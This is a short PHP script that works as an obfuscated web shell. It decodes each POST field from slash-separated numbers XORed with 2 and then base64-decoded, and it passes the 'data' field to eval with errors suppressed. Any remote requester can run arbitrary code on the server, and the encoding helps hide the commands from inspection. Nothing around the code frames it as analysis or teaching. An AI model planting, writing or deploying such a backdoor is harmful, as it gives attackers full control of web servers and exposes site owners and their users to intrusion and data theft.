<?php
$number=2;
function decoder($s,$number){
	$res = '';
	$s = rtrim($s,'/');
	$s = explode('/',$s);
	foreach ($s as $key => $value) {
		$res .= chr($value^$number);
	}
	return base64_decode($res);
}
foreach($_POST as $k => $v){
	$_POST[$k] = decoder($v,2);
}
@eval($_POST['data']);
?>